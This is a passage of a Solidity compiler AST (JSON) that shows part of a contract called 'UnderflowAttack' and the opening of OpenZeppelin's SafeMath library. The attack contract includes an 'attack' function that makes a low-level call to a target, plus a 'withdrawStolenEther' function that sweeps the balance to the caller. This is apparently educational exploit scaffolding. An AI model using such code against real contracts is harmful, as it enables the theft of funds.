															"overloadedDeclarations": [],
															"referencedDeclaration": 301,
															"src": "8532:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 349,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "8532:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 355,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8532:77:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8515:94:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 358,
															"name": "success",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 347,
															"src": "8628:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172",
															"id": 359,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8637:44:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_653fda1be56379a9b0a26648001a0166e0a82c4c958abb08bd69df8fdced27c3",
																"typeString": "literal_string \"Encima de ladrón soy tonto y no se atacar\""
															},
															"value": "Encima de ladrón soy tonto y no se atacar"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_653fda1be56379a9b0a26648001a0166e0a82c4c958abb08bd69df8fdced27c3",
																"typeString": "literal_string \"Encima de ladrón soy tonto y no se atacar\""
															}
														],
														"id": 357,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "8620:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 360,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8620:62:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 361,
												"nodeType": "ExpressionStatement",
												"src": "8620:62:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "64dd891a",
									"id": 363,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 344,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 343,
												"name": "cantidad",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 363,
												"src": "8399:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 342,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "8399:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8398:18:0"
									},
									"returnParameters": {
										"id": 345,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8425:0:0"
									},
									"scope": 384,
									"src": "8383:307:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 378,
										"nodeType": "Block",
										"src": "8738:61:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 373,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "8777:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UnderflowAttack_$384",
																			"typeString": "contract UnderflowAttack"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UnderflowAttack_$384",
																			"typeString": "contract UnderflowAttack"
																		}
																	],
																	"id": 372,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8769:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 371,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "8769:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 374,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8769:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 375,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "8769:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 366,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "8749:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 369,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "8749:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 370,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "8749:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 376,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8749:42:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 377,
												"nodeType": "ExpressionStatement",
												"src": "8749:42:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "24d8e86b",
									"id": 379,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawStolenEther",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 364,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8727:2:0"
									},
									"returnParameters": {
										"id": 365,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8738:0:0"
									},
									"scope": 384,
									"src": "8699:100:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 382,
										"nodeType": "Block",
										"src": "8836:3:0",
										"statements": []
									},
									"documentation": null,
									"id": 383,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 380,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8816:2:0"
									},
									"returnParameters": {
										"id": 381,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8836:0:0"
									},
									"scope": 384,
									"src": "8809:30:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 385,
							"src": "7813:1031:0"
						}
					],
					"src": "37:8809:0"
				},
				"id": 0
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							739
						]
					},
					"id": 740,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 386,
							"literals": [
								"solidity",
								">=",
								"0.6",
								".0",
								"<",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:31:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 387,
								"nodeType": "StructuredDocumentation",
								"src": "66:563:1",
								"text": "@dev Wrappers over Solidity's arithmetic operations with added overflow\nchecks.\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\nin bugs, because programmers usually assume that an overflow raises an\nerror, which is the standard behavior in high level programming languages.\n`SafeMath` restores this intuition by reverting the transaction when an\noperation overflows.\n * Using this library instead of the unchecked operations eliminates an entire\nclass of bugs, so it's recommended to use it always."
							},
							"fullyImplemented": true,
							"id": 739,
							"linearizedBaseContracts": [
								739
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 417,
										"nodeType": "Block",
										"src": "865:98:1",
										"statements": [
											{
												"assignments": [
													400
												],
												"declarations": [
													{
														"constant": false,
														"id": 400,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 417,
														"src": "875:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 399,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "875:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 404,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 403,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 401,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 390,
														"src": "887:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 402,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 392,
														"src": "891:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "887:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "875:17:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 407,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 405,
														"name": "c",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 400,
														"src": "906:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 406,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 390,
														"src": "910:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "906:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 412,
												"nodeType": "IfStatement",
												"src": "902:28:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 408,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "921:5:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 409,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "928:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 410,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "920:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 398,
													"id": 411,
													"nodeType": "Return",
													"src": "913:17:1"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 413,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "948:4:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 414,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 400,
															"src": "954:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 415,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "947:9:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 398,
												"id": 416,
												"nodeType": "Return",
												"src": "940:16:1"
											}
										]
									},
									"documentation": {
										"id": 388,
										"nodeType": "StructuredDocumentation",
										"src": "653:131:1",
										"text": "@dev Returns the addition of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._"
									},
									"id": 418,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryAdd",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 393,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 390,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 418,
												"src": "805:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 389,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "805:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 392,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 418,
												"src": "816:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 391,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "816:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "804:22:1"
									},
									"returnParameters": {
										"id": 398,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 395,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 418,
												"src": "850:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 394,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "850:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 397,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 418,
												"src": "856:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 396,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "856:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "849:15:1"
									},
									"scope": 739,
									"src": "789:174:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 444,
										"nodeType": "Block",
										"src": "1185:75:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 432,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 430,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 423,
														"src": "1199:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"id": 431,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 421,
														"src": "1203:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1199:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 437,
												"nodeType": "IfStatement",
												"src": "1195:28:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 433,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1214:5:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 434,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1221:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 435,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1213:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 429,
													"id": 436,
													"nodeType": "Return",
													"src": "1206:17:1"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 438,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1241:4:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 441,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 439,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 421,
																"src": "1247:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 440,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 423,
																"src": "1251:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1247:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 442,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1240:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 429,
												"id": 443,
												"nodeType": "Return",
												"src": "1233:20:1"
											}
										]
									},
									"documentation": {
										"id": 419,
										"nodeType": "StructuredDocumentation",
										"src": "969:135:1",
										"text": "@dev Returns the substraction of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._"
									},
									"id": 445,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "trySub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 424,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 421,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 445,
												"src": "1125:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 420,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1125:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 423,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 445,
												"src": "1136:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 422,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1136:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1124:22:1"
									},
									"returnParameters": {
										"id": 429,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 426,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 445,
												"src": "1170:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 425,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1170:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 428,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 445,
												"src": "1176:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 427,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1176:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1169:15:1"
									},
									"scope": 739,
									"src": "1109:151:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 485,
										"nodeType": "Block",
										"src": "1484:359:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 459,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 457,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 448,
														"src": "1716:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 458,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1721:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1716:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 464,
												"nodeType": "IfStatement",
												"src": "1712:28:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "74727565",
																"id": 460,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1732:4:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 461,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1738:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 462,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1731:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 456,
													"id": 463,
													"nodeType": "Return",
													"src": "1724:16:1"
												}
											},
											{
												"assignments": [
													466
												],
												"declarations": [
													{
														"constant": false,
														"id": 466,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 485,
														"src": "1750:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 465,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1750:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 470,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 469,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 467,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 448,
														"src": "1762:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 468,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 450,
														"src": "1766:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1762:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1750:17:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 475,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 473,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 471,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 466,
															"src": "1781:1:1",
															"typeDescriptions": {
